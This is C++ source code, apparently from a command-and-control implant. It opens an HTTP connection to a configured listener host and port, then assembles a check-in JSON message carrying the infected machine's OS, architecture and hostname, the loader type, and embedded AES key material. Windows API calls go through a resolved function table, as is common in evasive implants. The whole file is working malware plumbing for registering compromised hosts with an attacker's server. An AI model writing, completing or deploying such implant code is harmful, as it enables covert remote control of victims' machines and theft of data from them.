#include "core/handler.hpp"

namespace Handler
{
    VOID HTTPInit(State::PSTATE pState)
    {
		System::Http::WinHttpHandlers handlers = System::Http::RequestInit(
            pState->pProcs,
            pState->lpListenerHost,
            pState->nListenerPort
        );

        pState->hSession = handlers.hSession;
        pState->hConnect = handlers.hConnect;
    }

    std::wstring GetInitialInfoJSON(State::PSTATE pState)
    {
        std::wstring wOS = L"windows";
        std::wstring wArch = L"";
        std::wstring wHostname = L"";
        std::wstring wAesKey = AES_KEY_BASE64_W;
        std::wstring wAesIV = AES_IV_BASE64_W;      

        // Get architecture
        SYSTEM_INFO systemInfo;
        pState->pProcs->lpGetSystemInfo(&systemInfo);
        wArch = System::Arch::GetName(systemInfo.wProcessorArchitecture);

        // Get hostname and convert it to wstring
        WSADATA wsaData;
        if (pState->pProcs->lpWSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
        {
            char szHostname[256] = "";
            gethostname(szHostname, 256);
            std::string sHostname(szHostname);
            wHostname = Utils::Convert::UTF8Decode(sHostname);

            pState->pProcs->lpWSACleanup();
        }

        std::wstring wJSON = L"{";
        wJSON += L"\"os\":\"" + wOS + L"\"";
        wJSON += L",";
        wJSON += L"\"arch\":\"" + wArch + L"\"";
        wJSON += L",";
        wJSON += L"\"hostname\":\"" + wHostname + L"\"";
        wJSON += L",";
        wJSON += L"\"loaderType\":\"" + std::wstring(pState->lpPayloadType) + L"\"";
        wJSON += L",";
        wJSON += L"\"aesKey\":\"" + wAesKey + L"\"";
        wJSON += L",";
        wJSON += L"\"aesIV\":\"" + wAesIV + L"\"";
        wJSON += L"}";

        return wJSON;
    }
}